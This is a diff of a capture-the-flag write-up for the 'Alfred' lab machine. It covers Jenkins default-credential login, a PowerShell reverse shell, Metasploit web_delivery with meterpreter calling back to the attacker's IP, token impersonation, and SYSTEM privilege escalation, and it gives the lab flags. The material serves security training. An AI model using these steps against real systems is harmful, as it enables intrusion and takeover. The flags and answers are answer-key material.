@@ -54,7 +54,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.41.147
 
-
 http://10.10.41.147:8080/
 
 Default credentials for Jenkins are admin:password but we know here (look at the format of the expected answer) that both the login and the passwords are 5 characters. 
@@ -75,7 +74,6 @@ To execute commands via Jenkins, follow these steps:
 Based on this, we will create a reverse shell.
 
 First, download the Invoke-PoweShellTcp.ps1 powershell script and make it available through a web server: 
-
 
 ┌──(kali㉿kali)-[~]
 └─$ mkdir alfred   
@@ -126,7 +124,6 @@ PS C:\Program Files (x86)\Jenkins\workspace\project>ipconfig
 
 Windows IP Configuration
 
-
 Ethernet adapter Local Area Connection 2:
 
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
@@ -142,24 +139,13 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 PS C:\Program Files (x86)\Jenkins\workspace\project> more 'C:\users\bruce\desktop\user.txt'
 79007a09481963edf2e1321abd9ae2a0
 
-
 ```
 
 How many ports are open? (TCP only)
 *3*
 
-
 What is the username and password for the log in panel(in the format username:password)
 *admin:admin*
-
-
-![[Pasted image 20220927095714.png]]
-
-![[Pasted image 20220927105933.png]]
-
-![[Pasted image 20220927110310.png]]
-
-![[Pasted image 20220927110338.png]]
 
 What is the user.txt flag? 
 use nishang to get a reverse shell
@@ -277,7 +263,6 @@ Let’s use a different approach to directly upload a reverse shell
 
 Let’s rather use exploit/multi/script/web_delivery. 
 
-
 ┌──(kali㉿kali)-[~/alfred]
 └─$ msfconsole -q
 msf6 > use exploit/multi/script/web_delivery
@@ -305,7 +290,6 @@ Module options (exploit/multi/script/web_delivery):
                                        ated)
    URIPATH                   no        The URI to use for this exploit (default is random)
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -314,13 +298,11 @@ Payload options (windows/meterpreter/reverse_tcp):
    LHOST     10.11.81.220     yes       The listen address (an interface may be specified)
    LPORT     1234             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    2   PSH
-
 
 msf6 exploit(multi/script/web_delivery) > run
 [*] Exploit running as background job 0.
@@ -348,12 +330,9 @@ Active sessions
 
 msf6 exploit(multi/script/web_delivery) > 
 
-
 so upload the b64 into jenkins the same before
 
 priv esc
-
-
 
 msf6 exploit(multi/script/web_delivery) > sessions -i 1
 [*] Starting interaction with 1...
@@ -561,9 +540,7 @@ Process List
  2996  668   TrustedInstalle  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\servicing\Trust
              r.exe                                                      edInstaller.exe
 
-
 We want to migrate to a process that is owned by NT AUTHORITY\SYSTEM (e.g. svchost.exe with PID 2732): 
-
 
 meterpreter > migrate 2732
 [*] Migrating from 2224 to 2732...
@@ -605,26 +582,17 @@ C:\Windows\System32\config>more root.txt
 more root.txt
 dff0f748678f280250f25a45b8046b4a
 
-
-
 ```
 
 View all the privileges using whoami /priv
 
-
-
 You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.
-
 
 	To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?
 
 	*NT AUTHORITY\SYSTEM*
 
-
 Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
-
-
-
 
 	read the root.txt file at C:\Windows\System32\config
 either do this by dropping into a shell or using a meterpreter command
